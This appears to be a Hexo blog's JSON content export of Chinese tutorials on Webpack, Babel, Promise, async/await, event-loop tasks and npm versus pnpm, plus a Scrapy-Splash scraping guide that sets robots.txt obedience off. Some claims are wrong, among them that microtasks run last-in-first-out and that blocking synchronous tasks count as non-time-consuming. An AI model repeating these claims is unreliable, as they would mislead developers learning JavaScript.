命令的耗时问题有所帮助。","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"},{"name":"WebPack","slug":"WebPack","permalink":"http://blog.ioimp.top/tags/WebPack/"}]},{"title":"WebPack对Js降级实现兼容低版本浏览器","slug":"WebPack对js降级实现兼容低版本浏览器","date":"2023-12-22T07:34:51.000Z","updated":"2023-12-22T08:16:09.125Z","comments":true,"path":"2023/12/22/WebPack对js降级实现兼容低版本浏览器/","link":"","permalink":"http://blog.ioimp.top/2023/12/22/WebPack%E5%AF%B9js%E9%99%8D%E7%BA%A7%E5%AE%9E%E7%8E%B0%E5%85%BC%E5%AE%B9%E4%BD%8E%E7%89%88%E6%9C%AC%E6%B5%8F%E8%A7%88%E5%99%A8/","excerpt":"","text":"在前端开发中，我们经常会遇到兼容性的问题，特别是在低版本浏览器中。为了解决这个问题，Webpack提供了一种降级的方式，可以实现在低版本浏览器中兼容新的JavaScript语法和功能。 什么是WebpackWebpack是一个现代化的前端构建工具，它能够将多个JavaScript文件打包成一个或多个bundle文件，从而提高网站性能和加载速度。除此之外，Webpack还提供了许多其他功能，如代码分割、模块化、热模块替换等。 为什么需要兼容低版本浏览器虽然现代浏览器已经支持了许多新的JavaScript语法和功能，但是在实际开发中我们仍然需要兼容低版本浏览器。因为在某些情况下，用户可能仍然使用低版本的浏览器，我们不能因为他们的浏览器版本低就让他们无法正常使用我们的网站或应用。 Webpack如何实现兼容低版本浏览器Webpack提供了一些插件和配置选项，可以帮助我们实现兼容低版本浏览器。下面是一些常用的方法： Babel插件Babel是一个广泛使用的JavaScript编译器，它可以将新的JavaScript语法转换成低版本浏览器可以理解的语法。在Webpack中，我们可以使用Babel插件来处理JavaScript文件。 首先，我们需要安装一些必要的Babel插件： 1npm install babel-loader @babel/core @babel/preset-env --save-dev 然后，在Webpack配置文件中，我们需要添加一个规则来处理JavaScript文件： 1234567891011121314module: &#123; rules: [ &#123; test: /\\.js$/, exclude: /node_modules/, use: &#123; loader: &#x27;babel-loader&#x27;, options: &#123; presets: [&#x27;@babel/preset-env&#x27;] &#125; &#125; &#125; ]&#125; 这样，Webpack就会使用Babel插件来转换JavaScript文件，并将其输出到bundle文件中。 Polyfill除了转换新的JavaScript语法外，我们还需要处理一些新的JavaScript功能，比如Promise、Map、Set等。为了在低版本浏览器中使用这些功能，我们可以使用Polyfill。 Polyfill是一种JavaScript代码片段，它可以在低版本浏览器中实现新的JavaScript功能。在Webpack中，我们可以使用@babel/polyfill插件来引入Polyfill。 首先，我们需要安装@babel/polyfill插件： 1npm install @babel/polyfill --save 然后，在入口文件中，我们需要引入Polyfill： 1import &#x27;@babel/polyfill&#x27;; 这样，Webpack会将Polyfill打包到bundle文件中，并在低版本浏览器中自动加载。 其他配置选项除了Babel插件和Polyfill外，Webpack还提供了其他一些配置选项，可以帮助我们实现兼容低版本浏览器。比如，我们可以使用target选项来指定要兼容的浏览器版本： 1target: [&#x27;web&#x27;, &#x27;browserslist:ie &gt;= 8&#x27;] 这样，Webpack会根据我们的配置自动处理兼容性问题。 总结在本文中，我们介绍了Webpack如何实现兼容低版本浏览器的方法。通过使用Babel插件、Polyfill和其他配置选项，我们可以让我们的网站或应用在低版本浏览器中正常运行。希望本文对你有所帮助！","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"},{"name":"WebPack","slug":"WebPack","permalink":"http://blog.ioimp.top/tags/WebPack/"}]},{"title":"Webpack中加载器模式设为asset，为什么以8KB大小区分图片","slug":"Webpack中加载器模式设为asset，为什么以8KB大小区分图片","date":"2023-12-22T07:11:39.000Z","updated":"2023-12-22T07:34:50.722Z","comments":true,"path":"2023/12/22/Webpack中加载器模式设为asset，为什么以8KB大小区分图片/","link":"","permalink":"http://blog.ioimp.top/2023/12/22/Webpack%E4%B8%AD%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%A8%A1%E5%BC%8F%E8%AE%BE%E4%B8%BAasset%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BB%A58KB%E5%A4%A7%E5%B0%8F%E5%8C%BA%E5%88%86%E5%9B%BE%E7%89%87/","excerpt":"","text":"Webpack中加载器模式设为asset，为什么以8KB大小区分图片在Webpack中，加载器模式可以设置为asset，用于处理资源文件（例如图片、字体等）。 默认情况下，Webpack会根据资源文件的大小来决定如何处理。当资源文件的大小小于8KB时，Webpack会将其转换为Data URL（base64编码）并直接嵌入到生成的JS文件中，以减少HTTP请求。而当资源文件的大小大于等于8KB时，Webpack会将其处理为独立的文件，并通过URL引用的方式加载。 这种区分是为了平衡代码体积和加载性能之间的关系。将小文件转换为Data URL可以减少HTTP请求的数量，但会增加JS文件的体积，可能导致加载时间变长。而将大文件作为独立文件加载可以减小JS文件的体积，但会增加HTTP请求的数量，可能导致加载时间变长。 因此，8KB是一个经验值，可以根据具体项目的需求进行调整。如果项目中有大量的小文件，可以考虑将此值调低，以减少HTTP请求的数量；如果项目中有大量的大文件，可以考虑将此值调高，以减小JS文件的体积。 将图片转换为base64编码的好处和坏处如下：好处： 减少HTTP请求：将图片转换为base64编码后，可以直接嵌入到HTML、CSS或JavaScript文件中，避免了额外的HTTP请求，从而加快页面加载速度。 简化项目结构：将图片嵌入到代码中，可以减少项目中的文件数量，简化项目结构，方便管理和部署。 提高图片加载速度：由于base64编码的图片嵌入到文件中，不需要再进行额外的网络请求，因此可以减少图片的加载时间。 坏处： 增加文件体积：base64编码会使图片的体积增加约1&#x2F;3，因为编码后的文本比原始二进制数据要大。这可能导致文件体积增大，特别是当有多个图片被转换为base64编码时，会增加整个文件的大小。 缓存问题：base64编码的图片无法被浏览器缓存，因为它们被嵌入到了文件中。每次文件更新都会导致图片重新下载，这可能会影响网页的性能。 不适用于大型图片：由于base64编码会增加文件体积，因此对于大型图片（通常超过几十KB或更大）来说，将其转换为base64编码可能导致文件过大，影响页面加载速度。 因此，将图片转换为base64编码适用于小型图标或小图片，并且在需要减少HTTP请求和简化项目结构的情况下使用。对于大型图片，最好将其作为独立文件加载，以避免文件过大和缓存问题。 WebPack如何处理字体图标","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"},{"name":"WebPack","slug":"WebPack","permalink":"http://blog.ioimp.top/tags/WebPack/"}]},{"title":"宏任务和微任务的区别","slug":"宏任务和微任务的区别","date":"2023-12-21T16:52:10.000Z","updated":"2023-12-21T16:53:53.609Z","comments":true,"path":"2023/12/22/宏任务和微任务的区别/","link":"","permalink":"http://blog.ioimp.top/2023/12/22/%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"宏任务是由浏览器引擎进行调度和执行的，它们会被放入宏任务队列中，并且按照队列的顺序执行。宏任务的执行时间较长，因此会造成较大的延迟。常见的宏任务包括DOM事件处理、setTimeout和setInterval等。 微任务是在宏任务执行完毕之后立即执行的任务，它们会被放入微任务队列中，并且在宏任务队列为空时执行。微任务的执行时间较短，因此不会造成较大的延迟。常见的微任务包括Promise的resolve和reject回调、MutationObserver和process.nextTick等。 由于微任务会在宏任务执行完毕之后立即执行，因此微任务的优先级较高。也就是说，当一个宏任务执行完毕后，会立即执行所有的微任务，而不会等待下一个宏任务。这样可以保证微任务的执行顺序不会被打乱。 总结起来，宏任务的执行顺序是先进先出，而微任务的执行顺序是后进先出。宏任务的执行时间较长，会造成较大的延迟，而微任务的执行时间较短，不会造成较大的延迟。微任务的优先级较高，会在宏任务执行完毕之后立即执行。","categories":[],"tags":[]},{"title":"为什么说同步任务是非耗时任务，异步任务是耗时任务","slug":"为什么说同步任务是非耗时任务，异步任务是耗时任务","date":"2023-12-21T16:35:58.000Z","updated":"2023-12-21T16:43:04.362Z","comments":true,"path":"2023/12/22/为什么说同步任务是非耗时任务，异步任务是耗时任务/","link":"","permalink":"http://blog.ioimp.top/2023/12/22/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4%E5%90%8C%E6%AD%A5%E4%BB%BB%E5%8A%A1%E6%98%AF%E9%9D%9E%E8%80%97%E6%97%B6%E4%BB%BB%E5%8A%A1%EF%BC%8C%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1%E6%98%AF%E8%80%97%E6%97%B6%E4%BB%BB%E5%8A%A1/","excerpt":"","text":"同步任务是指在程序执行过程中，必须等待该任务完成后才能继续执行下面的代码。因为同步任务会阻塞程序的执行，所以它通常被认为是非耗时任务。 异步任务是指在程序执行过程中，不需要等待该任务完成就可以继续执行下面的代码。异步任务通常会通过多线程、回调函数或者事件驱动等方式实现。由于异步任务不会阻塞程序的执行，所以它通常被认为是耗时任务。 需要注意的是，同步任务和异步任务的耗时性质与任务本身的执行时间没有直接关系。一个同步任务可能执行时间很长，但它会阻塞程序的执行，所以被认为是非耗时任务。而一个异步任务可能执行时间很短，但它不会阻塞程序的执行，所以被认为是耗时任务。 耗时和非耗时的区分是相对于程序整体执行流程而言的。耗时任务通常指的是那些需要较长时间才能完成的任务，比如访问网络、读写大文件、进行复杂计算等。这些任务如果以同步方式执行，会导致程序在等待任务完成期间无法进行任何其他操作，即阻塞了程序的执行流程，用户体验较差。 非耗时任务则是那些可以迅速完成的任务，如简单的数学计算、修改变量值等。这些任务即使以同步方式执行，也不会对程序的流畅性造成太大影响。 因此，在编程中，通常会将耗时任务设计为异步执行，以避免阻塞主线程，提高程序的响应性和效率。通过回调函数、Promise、async&#x2F;await等机制，可以在耗时任务完成后再执行相关的操作，而不必让整个程序等待耗时任务的完成。这就是为什么通常将同步任务视为非耗时任务，而将异步任务视为耗时任务的原因。 同步任务和异步任务的执行过程","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"},{"name":"异步操作","slug":"异步操作","permalink":"http://blog.ioimp.top/tags/%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/"}]},{"title":"Node中async/await的详解","slug":"Node中async-await的详解","date":"2023-12-21T16:23:35.000Z","updated":"2023-12-21T16:30:07.422Z","comments":true,"path":"2023/12/22/Node中async-await的详解/","link":"","permalink":"http://blog.ioimp.top/2023/12/22/Node%E4%B8%ADasync-await%E7%9A%84%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"async&#x2F;await的基本使用async&#x2F;await是ES8中引入的新语法，用于简化promise的异步操作。 使用async关键字修饰函数，表示该函数是一个异步函数。异步函数内部可以使用await关键字来等待一个promise对象的执行结果。 await关键字可以放在任何返回promise的表达式前面，它会暂停函数的执行，直到promise被解析或拒绝。如果promise被解析，await表达式会返回解析的值；如果promise被拒绝，await表达式会抛出一个错误。 异步函数可以像普通函数一样返回一个值，返回的值会被包装成一个被解析的promise对象。 以下是示例代码： 1234567891011121314151617// 异步函数示例async function fetchData() &#123; // 使用await等待promise的执行结果 const result = await fetch(&#x27;https://api.example.com/data&#x27;); // 返回一个被解析的promise对象 return result.json();&#125;// 调用异步函数示例fetchData() .then(data =&gt; &#123; console.log(data); &#125;) .catch(error =&gt; &#123; console.error(error); &#125;); 在上面的示例中，fetchData是一个异步函数，使用await关键字等待fetch函数返回的promise对象的执行结果。在fetchData函数内部，可以像同步代码一样使用result变量来访问fetch函数返回的结果。 调用异步函数时，可以像调用普通函数一样使用.then和.catch方法来处理异步操作的结果。在上面的示例中，使用.then方法来处理异步操作的成功结果，使用.catch方法来处理异步操作的错误结果。 通过使用async&#x2F;await，我们可以将异步操作的代码写得更加简洁、易读，并且可以避免使用链式调用then的方式。 注意事项1. 使用环境 async和await是ES7的新特性，需要确保Node版本至少为7.6.0或更高。 async函数返回一个Promise对象，可以使用.then()和.catch()进行链式调用。 2. 错误处理 使用await时，如果Promise被拒绝（reject），会抛出异常。因此需要使用try...catch语句进行错误处理。 如果没有正确处理错误，可能会导致程序崩溃。 3. 循环中使用 在循环中使用await时，需要注意可能会导致代码变成串行执行，影响性能。 如果需要并行执行，可以使用Promise.all()。 4. await的使用 await只能在async函数内部使用。 await后面跟着的应该是一个Promise对象或者任何要等待的值。 在async修饰的方法中，第一个await之前的代码都是同步执行的，而第一个await之后的代码都会异步执行。 5. 返回值 async函数总是返回一个Promise，即使函数内部没有使用await。 如果async函数内部抛出错误，返回的Promise会被拒绝（reject）。 6. await的等待 await会暂停其后的代码执行，直到Promise解决（resolve）或拒绝（reject）。 7. 调试 在使用async和await时，可能会使得调试变得更加困难，因为它们会改变错误堆栈的追踪方式。","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"},{"name":"异步操作","slug":"异步操作","permalink":"http://blog.ioimp.top/tags/%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/"}]},{"title":"Node中Promise 对象的意思","slug":"Node中Promise-对象的意思","date":"2023-12-21T02:56:30.000Z","updated":"2023-12-21T16:02:47.417Z","comments":false,"path":"2023/12/21/Node中Promise-对象的意思/","link":"","permalink":"http://blog.ioimp.top/2023/12/21/Node%E4%B8%ADPromise-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%84%8F%E6%80%9D/","excerpt":"","text":"Node中Promise 对象的意思Promise 对象是 JavaScript 中处理异步操作的一种方式，它代表了一个异步操作的最终完成或失败，并可以返回一个结果或错误。 Promise 的基本概念 Promise 是一个构造函数 我们可以创建Promise的实例 const p&#x3D; new Promise() new 出来的一个实例对象，代表一个异步操作 Promise.prototype上包含then() .then（）方法用来预先指定成功和失败的回调函数 p.then(成功回调函数，失败的回调函数) p.then(result&#x3D;&gt;{},error&#x3D;&gt;{}) Promise 对象有三种状态： Pending（进行中）：初始状态，表示异步操作还在进行中，既不是成功也不是失败状态。 Fulfilled（已完成）：表示异步操作成功完成，并返回了一个结果。 Rejected（已失败）：表示异步操作失败，并返回了一个错误。 Promise 对象的构造函数接受一个执行器函数作为参数，这个执行器函数有两个参数，分别是 resolve 和 reject 函数。在执行器函数中，我们可以执行异步操作，并在适当的时候调用 resolve 或 reject 函数来改变 Promise 对象的状态。 Promise 对象具有以下特点： Promise 对象是不可变的，一旦状态改变就无法再次改变。 Promise 对象可以通过 .then() 方法添加成功状态的回调函数，通过 .catch() 方法添加失败状态的回调函数，也可以使用 .finally() 方法添加无论成功或失败都会执行的回调函数。 Promise 对象可以通过 Promise 链实现对多个异步操作的串行或并行处理。 Promise 对象可以通过 async/await 语法进行更简洁的异步操作处理。 可以用console.dir(Promise) 来查课Promise对象的属性使用 Promise 对象可以更好地处理异步操作，避免了回调地狱和层层嵌套的问题，使代码更加清晰和可维护。console.dir 是 JavaScript 中的一个方法，用于将一个对象的所有可枚举属性打印到控制台中，以便查看对象的结构和属性。 该方法接受一个对象作为参数，并将对象的属性以键值对的形式打印到控制台中。与 console.log() 方法不同，console.dir() 方法会显示对象的属性的详细信息，包括属性名称、属性值和属性的数据类型。 console.dir() 方法在调试和开发过程中非常有用，可以帮助开发人员了解对象的结构和属性，以便更好地理解和调试代码。 123456789101112131415161718192021222324252627282930313233343536// 利用node fs模块进行的读取文件操作 三次嵌套容易引起回调地狱// const &#123; error &#125; = require(&#x27;console&#x27;);// let fs = require(&#x27;fs&#x27;);// fs.readFile(&#x27;./file/test1.txt&#x27;,&#x27;utf-8&#x27;,(error,res)=&gt;&#123;// if(error) console.log(error.message)// console.log(res)// fs.readFile(&#x27;./file/test2.txt&#x27;,&#x27;utf-8&#x27;,(error,res)=&gt;&#123;// if(error) console.log(error.message)// console.log(res)// fs.readFile(&#x27;./file/test3.txt&#x27;,&#x27;utf-8&#x27;,(error,res)=&gt;&#123;// if(error) console.log(error.message)// console.log(res)// &#125;)// &#125;)// &#125;)// 利用then-fs来进行文件读取操作（未进行顺序处理）// import thenFs from &#x27;then-fs&#x27;// thenFs.readFile(&#x27;./file/test.txt&#x27;,&#x27;utf8&#x27;).then((r1)=&gt;&#123;console.log(r1)&#125;)// thenFs.readFile(&#x27;./file/test2.txt&#x27;,&#x27;utf8&#x27;).then((r2)=&gt;&#123;console.log(r2)&#125;)// thenFs.readFile(&#x27;./file/test3.txt&#x27;,&#x27;utf8&#x27;).then((r3)=&gt;&#123;console.log(r3)&#125;)// then-fs顺序处理import thenFs from &#x27;then-fs&#x27;thenFs.readFile(&#x27;./file/test.txt&#x27;,&#x27;utf8&#x27;).then((r1)=&gt;&#123; console.log(r1) return thenFs.readFile(&#x27;./file/test2.txt&#x27;,&#x27;utf8&#x27;).then((r2)=&gt;&#123; console.log(r2) thenFs.readFile(&#x27;./file/test3.txt&#x27;,&#x27;utf8&#x27;).then((r3)=&gt;&#123; console.log(r3) &#125;) &#125;)&#125;)","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"}]},{"title":"npm和pnpm的区别","slug":"npm和pnpm的区别","date":"2023-12-21T01:43:41.000Z","updated":"2023-12-21T01:44:43.544Z","comments":true,"path":"2023/12/21/npm和pnpm的区别/","link":"","permalink":"http://blog.ioimp.top/2023/12/21/npm%E5%92%8Cpnpm%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"pnpm 和 npm 都是 JavaScript 包管理工具，用于安装和管理项目的依赖。 安装速度：pnpm 在安装依赖时使用了硬链接的方式，可以复用已安装的依赖，因此安装速度更快。而 npm 则会将依赖完全复制到项目的 node_modules 目录中，因此安装速度相对较慢。 磁盘空间占用：由于 pnpm 使用了硬链接的方式，相同的依赖只会在磁盘上占用一份空间，因此 pnpm 的磁盘空间占用相对较小。而 npm 则会将每个项目的依赖都完整地复制到项目的 node_modules 目录中，因此磁盘空间占用较大。 内存占用：pnpm 在安装和运行时只需要占用较少的内存，因为它使用了硬链接和符号链接来共享依赖。而 npm 则需要占用较多的内存，因为它会将所有的依赖都解压到内存中。 兼容性：由于 pnpm 使用了硬链接和符号链接的方式，可能在某些操作系统或文件系统上不兼容。而 npm 则是使用了标准的文件复制方式，因此更加兼容。 综上所述，pnpm 相对于 npm 来说，在安装速度、磁盘空间占用和内存占用方面有一定的优势，但在兼容性方面可能存在一些问题。因此，在选择使用哪个工具时，可以根据具体的项目需求和环境来决定。 pnpm 在安装依赖时会将依赖信息添加到项目的 package.json 文件中。这与 npm 的行为是一致的。当你使用 pnpm 安装依赖时，会自动更新 package.json 文件的 dependencies 或 devDependencies 字段，将安装的依赖添加到其中，以便项目在其他环境中能够正确地安装和运行所需的依赖。","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Node.js","slug":"Node-js","permalink":"http://blog.ioimp.top/tags/Node-js/"}]},{"title":"Scrapy_Splash的使用","slug":"13-Scrapy-Splash的使用","date":"2023-12-03T04:00:18.000Z","updated":"2023-12-03T04:02:14.277Z","comments":true,"path":"2023/12/03/13-Scrapy-Splash的使用/","link":"","permalink":"http://blog.ioimp.top/2023/12/03/13-Scrapy-Splash%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Scrapy_splash模块使用一. Splash后续的爬虫的课程. 随便随时来听. – 樵夫说的. splash是一个可以动态渲染js的工具. 有助于我们完成复杂的js内容加载工作. 你可以理解为另一个没有界面的selenium. 1.1 splash安装splash的安装过程十分复杂. 复杂到官方都不推荐你去手动安装它. 官方建议. 用docker去安装splash. 所以. 你需要先去安装docker. 但是docker这玩意在windows上支持非常不好. 各种各样的问题. 外加上后期我们要把爬虫部署到linux. 那干脆. 我们就安装一个linux. 在linux上搞docker是非常easy的. 有能力, 不怕苦的同学可以在windows上搞一个docker试试. 我这里就不带你们找坑踩了. 直接上Linux. 1.1.1安装VM 1.1.2 安装Linux 安装好的linux后,我们需要学会使用linux的一个工具. 叫yum, 我们需要用它来帮我们完成各种软件的安装. 十分的方便. 我们先用ifconfig来做一个测试. 123yum search ifconfig // 搜索出ifconfig的包yum install net-tools.x86_64 // 安装该软件, 安装过程中会出现很多个询问. 直接y即可 发现了吧, 在linux这个破黑窗口里. 属实难受+憋屈. 所以, 我们这里选择用ssh远程连接linux. mac版本: 打开终端. 输入 12ssh root@服务器ip地址输入密码 就可以顺利的链接到你的linux服务器. 接下来. 我们可以使用各种命令来操纵linux了. Windows: 1.1.3 安装docker​ 安装docker就一条例命令就好了 1[root@sylar-centos-2 ~]# yum install docker ​ 配置docker的源. 123456[root@sylar-centos-2 ~]# vi /etc/docker/daemon.json# 写入一下内容, 注意.先按&#x27;i&#x27;, 更换为输入模式. 然后再填写内容&#123; &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com/&quot;]&#125;# 保存: 先按esc. 退出输入模式, 然后输入&quot;:wq&quot; 表示写入, 退出. 就完事儿了 1[root@sylar-centos-2 ~]# systemctl start docker # 启动docker 1[root@sylar-centos-2 ~]# docker ps # 查看docker运行状态 如需关闭或者重新启动docker: 12systemctl stop docker # 停止docker服务systemctl restart docker # 重启docker服务 Vm -&gt; cenos -&gt; ssh -&gt; docker -&gt; splash 1.1.4 安装splash 拉取splash镜像 1docker pull scrapinghub/splash splash比较大. 大概2个G左右. 有点儿耐心等会儿就好了 运行splash 1docker run -p 8050:8050 scrapinghub/splash 打开浏览器访问splash http://192.168.31.82:8050/ 1.2 splash简单使用​ 我们可以在文本框内输入百度的网址. 然后点击render. 可以看到splash会对我们的网页进行动态的加载. 并返回截图. 运行状况. 以及页面代码(经过js渲染后的) 快速解释一下, script中的脚本. 这里面用的是lua的脚本语法. 所以看起来会有些难受. 123456789function main(splash, args) -- 主函数 assert(splash:go(args.url)) -- 进入xxx页面 assert(splash:wait(0.5)) -- 等待0.5秒 return &#123; -- 返回 html = splash:html(), -- splash:html() 页面源代码 png = splash:png(), -- splash:png() 页面截图 har = splash:har(), -- splash:har() 页面加载过程 &#125;end -- 函数结束 有必要说明一下. 在lua中, .表示的是属性(变量), :表示的是方法(函数)的调用. 常见操作符都一样. 剩下的. 我们到案例里看. 1.3 splash的http-api接口splash提供了对外的http-api接口. 我们可以像访问一个普通url一样访问splash. 并由splash帮助我们渲染好页面内容. 1http://192.168.31.82:8050/render.html?url=http://www.baidu.com 虽然看不出任何差别. 但是你心里要清楚一个事情. 此时拿到的直接是经过js渲染后的html 我们换个url你就知道了 1http://192.168.31.82:8050/render.html?url=https://www.endata.com.cn/BoxOffice/BO/Year/index.html&amp;wait=5 endata这个网站. 它的数据是后期经过ajax请求二次加载进来的. 我们通过splash可以等待它后期加载完再拿html. 综上, splash的工作机制: 整个一个代理服务器的逻辑. ~~~~ 二. python中使用splash2.1 splash在python中如何使用既然splash提供了http-api接口. 那我们就可以像请求普通网站一样去请求到splash.在python中, 我们最熟悉的能发送http请求的东西就是requests了. 接下来.我们就用requests来完成splash的对接. 1234567891011121314151617181920212223import requests&quot;&quot;&quot;# splash提供的api接口渲染html的接口http://192.168.31.184:8050/render.html?url=你的url&amp;wait=等待时间&amp;time_out=超时时间截图的接口http://192.168.31.184:8050/render.png 参数和render.html基本一致, 可选width, height加载过程接口http://192.168.31.184:8050/render.har 参数和render.html基本一致json接口http://192.168.31.184:8050/render.json 参数和render.html基本一致执行lua脚本的接口http://192.168.31.184:8050/execute?lua_source=你要执行的lua脚本&quot;&quot;&quot;# 最简单的调用splash的render.htmlurl = &quot;http://192.168.31.184:8050/render.html?url=https://www.baidu.com&amp;wait=5&quot;resp = requests.get(url)print(resp.text) 2.2 我们以网易新闻首页要闻为例.先搞定脚本部分. 12345678910111213141516171819202122232425262728293031323334function main(splash, args) assert(splash:go(args.url)) assert(splash:wait(1)) -- 加载一段js, 后面作为lua函数进行调用. -- 在这个脚本中, 主要返回了&quot;加载更多&quot;按钮的状态 get_display_style = splash:jsfunc([[ function()&#123; return document.getElementsByClassName(&#x27;load_more_btn&#x27;)[0].style.display; &#125; ]]) -- lua中的循环语句. 和python的while功能一样. while (true) do -- 语法规定. 相当于开始 -- 直接运行js代码, 滚动到&#x27;加载更多&#x27;按钮 splash:runjs(&quot;document.getElementsByClassName(&#x27;load_more_btn&#x27;)[0].scrollIntoView(true)&quot;) -- 等待 splash:wait(1) -- 找到该按钮. 点击它 splash:select(&quot;.load_more_btn&quot;).click() -- 调用上方预制的js脚本, 获取&#x27;正在加载按钮&#x27;的状态 display_style = get_display_style() -- 如果不显示了. 也就结束了 if(display_style== &#x27;none&#x27;) then break -- 同python中的break. 打断循环 end end assert(splash:wait(2)) -- 不在乎多等2秒 return &#123; html = splash:html(), png = splash:png(), har = splash:har(), &#125;end 到了python里面就可以使用这个脚本了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# 执行lua脚本lua = &quot;&quot;&quot;function main(splash, args) assert(splash:go(args.url)) assert(splash:wait(0.5)) -- 加载一段js, 后面作为lua函数进行调用. -- 在这个脚本中, 主要返回了&quot;加载更多&quot;按钮的状态 get_display_style = splash:jsfunc([[ function()&#123; return document.getElementsByClassName(&#x27;load_more_btn&#x27;)[0].style.display; &#125; ]]) -- lua中的循环语句. 和python的while功能一样. while (true) do -- 语法规定. 相当于开始 -- 直接运行js代码, 滚动到&#x27;加载更多&#x27;按钮 splash:runjs(&quot;document.getElementsByClassName(&#x27;load_more_btn&#x27;)[0].scrollIntoView(true)&quot;) -- 等待 splash:wait(1) -- 找到该按钮. 点击它 splash:select(&quot;.load_more_btn&quot;).click() -- 调用上方预制的js脚本, 获取&#x27;正在加载按钮&#x27;的状态 display_style = get_display_style() -- 如果不显示了. 也就结束了 if(display_style== &#x27;none&#x27;) then break -- 同python中的break. 打断循环 end end assert(splash:wait(2)) -- 不在乎多等2秒 return &#123; html = splash:html(), -- 拿到页面源代码 cookies = splash:get_cookies() -- 拿到cookies &#125;end&quot;&quot;&quot;# 准备能够执行lua脚本的url -&gt; splash服务地址url = &quot;http://192.168.31.82:8050/execute&quot;from lxml import etree# 远程访问splash, 执行脚本resp = requests.get(url, params=&#123; &quot;url&quot;:&quot;https://news.163.com&quot;, &quot;lua_source&quot;: lua&#125;)result = resp.json()# 提取结果tree = etree.HTML(result.get(&#x27;html&#x27;))# print(resp.text)divs = tree.xpath(&quot;//ul[@class=&#x27;newsdata_list fixed_bar_padding noloading&#x27;]/li[1]/div[2]/div&quot;)for div in divs: a = div.xpath(&quot;./div/div/h3/a&quot;) if not a: continue a = a[0] href = a.xpath(&#x27;./@href&#x27;) title = a.xpath(&#x27;./text()&#x27;) print(title, href)print(result.get(&quot;cookies&quot;)) ##三. scrapy_splash 安装scrapy_splash模块 1pip install scrapy_splash 创建一个普通的scrapy项目, 然后把scrapy_splash配置到settings文件中 12345678910111213141516171819202122232425# Crawl responsibly by identifying yourself (and your website) on the user-agentUSER_AGENT = &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36&#x27;# Obey robots.txt rulesROBOTSTXT_OBEY = False# scrapy_splash# 渲染服务的url, 这里换成你自己的SPLASH_URL = &#x27;http://192.168.31.82:8050&#x27;# 下载器中间件, 这个必须要配置DOWNLOADER_MIDDLEWARES = &#123; &#x27;scrapy_splash.SplashCookiesMiddleware&#x27;: 723, &#x27;scrapy_splash.SplashMiddleware&#x27;: 725, &#x27;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#x27;: 810,&#125;# 这个可由可无# 